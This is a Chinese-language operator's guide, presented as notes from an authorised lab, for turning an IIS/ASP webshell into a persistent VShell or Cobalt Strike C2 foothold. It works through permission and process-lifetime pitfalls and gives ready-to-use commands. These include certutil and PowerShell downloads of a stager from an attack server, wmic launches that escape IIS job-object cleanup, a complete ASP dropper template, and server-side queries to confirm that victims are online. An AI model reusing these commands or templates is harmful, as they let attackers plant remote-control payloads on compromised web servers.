# IIS/ASP WebShell 落地 C2 Payload 完整链路（VShell/CS 通用）

> 来源：2026-09-11 授权实验（靶机 Win7 SP1 / IIS 7.5 / ASP，目标 192.168.1.132，VShell 4.9.3 C2）。
> 适用：拿到 ASP/ASPX WebShell 后，要把 C2 payload 真正跑起来并稳定回连的场景。

## 一、三个必踩的坑（叠加才导致"命令成功但不上线"）

### 坑 1：`C:\Windows\Temp` 对 apppool 只可写、不可执行

IIS 应用池身份（如 `iis apppool\<site>`）默认对 `C:\Windows\Temp` 有**写**权限，但**没有**：
- 列目录权限 → `fso.FileExists()` / `File.Exists()` 在 ASP 内**一律返回 False**，即使文件确实存在
- 读权限 → 下到这里的 payload 无法被读取加载
- 执行权限 → `cmd /c C:\Windows\Temp\r.bat` 直接报 `拒绝访问。`

**后果**：WebShell 显示 "saved/done"，但文件从未被执行；同时探针的 `FileExists` 全 False 把排查方向带偏。

**修复**：
- **落地点必须用 Web 目录**（apppool 对该目录有完全控制），例如 `C:\inetpub\wwwroot\<site>\upload\`
- **文件系统状态一律从外部 SMB (`\\ip\C$\...`) 验证，绝不在 ASP 内部用 FileExists 判断**

### 坑 2：Win7/2008R2 的 `certutil -urlcache` 处理不了带 query 的 URL

VShell 官方 stager（`http://<ip>:<port>/swt` 下载的 `windows.bat`）内置：

```bat
certutil.exe -urlcache -split -f "http://<your-attack-server>:8084/?h=<your-attack-server>&p=8084&t=tcp&a=w64&stage=true" C:\Users\Public\xxx.exe
```

- 同一台机器上，`certutil ... http://ip:8084/swt`（**无 query**）**成功**
- 带 `?h=...&p=...&stage=true` 则**失败**，目标 exe 从未生成 —— stager 静默失败
- 老版 certutil 对 URL 查询串 + `&` 的解析有问题

**修复**：换 PowerShell 下载，绕开 certutil：

```powershell
(New-Object Net.WebClient).DownloadFile('http://ip:port/?h=...&p=...&t=tcp&a=w64&stage=true','C:\inetpub\wwwroot\site\upload\a.exe')
```

### 坑 3：WebShell 里 `start` 出去的进程活不过 HTTP 请求

WebShell 的"虚拟终端"本质是**替 `w3wp.exe` 起子进程**。HTTP 请求一结束，IIS 的 **Job Object 会整树回收**该进程 —— payload 刚启动就被杀，所以永远不上线。

**修复**：用 `wmic process call create`，让父进程变成 `WmiPrvSE.exe`，跳出 `w3wp` 的 Job Object：

```bat
wmic process call create "C:\inetpub\wwwroot\site\upload\a.exe"
```

返回 `ReturnValue = 0` + `ProcessId = N` 即启动成功。随后 `netstat -ano -p tcp | findstr <C2端口>` 可看到 `ESTABLISHED`。

## 二、VShell stager 参数语义（实测）

| 请求 | 返回大小 | 内容 | 能否直接执行 |
|------|---------|------|-------------|
| `/?h=<ip>&p=<port>&t=tcp&a=w64&stage=true` | 3584 B | PE **引导器/stage loader** | ✅ **能**（`MZ` 头） |
| `/?h=<ip>&a=w64`（无 stage / `stage=false`） | 5105152 B | **加密载荷块** | ❌ 不能 |
| `/` | 637 B | 默认页 | — |
| `/swt` | 496 B | 批处理 stager（`windows.bat`） | 是脚本 |

**关键区分**：
- 引导器是 PE（`4D 5A 90 00 ... PE`, `Machine=0x8664`）
- 无 stage 的 5MB 块**不是 PE**，开头 `D4 C3 DC CB 71 99 ...`，是必须由 loader 解密的密文
- 所以对无 stage 版本用 `wmic process call create` 会得到 **`ReturnValue = 8`（未知失败）** —— 这是**正确行为**，它本来就不是可执行文件

**WMI `Win32_Process.Create` 返回值**：`0` = 成功；`8` = 未知失败（常见于启动非 PE 文件）；`2`/`3`/`9` = 权限不足 / 路径不存在。

## 三、可复用 ASP 落地模板

关键是 **bat 自己写日志**（`>> %L%`），不要依赖外层 `sh.Run "... > log 2>&1"` —— 后者在 ASP 里经常不产出文件。

```vbscript
<%
base = "C:\inetpub\wwwroot\<site>\upload\"
L = base & "_log.txt"
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts = fso.CreateTextFile(base & "r.bat", True)
ts.WriteLine "@echo off"
ts.WriteLine "set L=" & L
ts.WriteLine "echo [1] download >> %L%"
ts.WriteLine "powershell -NoProfile -Command ""(New-Object Net.WebClient).DownloadFile('http://<C2>/…&stage=true','" & base & "a.exe')"" >> %L% 2>&1"
ts.WriteLine "echo dl_rc=%errorlevel% >> %L%"
ts.WriteLine "dir " & base & "a.exe >> %L% 2>&1"
ts.WriteLine "echo [2] launch >> %L%"
ts.WriteLine "wmic process call create """ & base & "a.exe"" >> %L% 2>&1"
ts.WriteLine "echo wmi_rc=%errorlevel% >> %L%"
ts.WriteLine "ping -n 9 127.0.0.1 >nul"
ts.WriteLine "netstat -ano -p tcp | findstr <C2端口> >> %L% 2>&1"
ts.WriteLine "echo [4] end >> %L%"
ts.Close
Set sh = CreateObject("WScript.Shell")
sh.Run "cmd /c """ & base & "r.bat""", 0, True
%>
```

**其他注意**：
- **不要用 `timeout /t`** 做等待 —— 非交互式 cmd 下 `timeout` 立即返回并报 "Input redirection is not supported"，会导致等待逻辑失效。用 `ping -n N 127.0.0.1 >nul`
- 探针里 `netstat` 走 `WScript.Shell.Exec` 在部分环境抛 `500 内部服务器错误`，改从 bat 内部重定向到文件更稳

## 四、上线确认（服务端侧）

VShell 数据在 `/opt/vshell/v_linux_amd64/db/data.db`（SQLite）：

```bash
sqlite3 data.db "select Id,IsConnect,Addr,LocalIP,HostName,UserName,OsName from clients;"
```

`IsConnect=1` + `Addr` 为**目标公网出口 IP** + `LocalIP` 为内网 IP = 在线。
配合 `ss -tn state established '( sport = :<port> )'` 看连接数。

> 注：`ProcessName` 若带 `(1)` 后缀，说明是**浏览器下载重名**产生的副本，即有人在桌面上手动双击运行过 —— 可用来区分"我推上去的"和"人工执行的"。
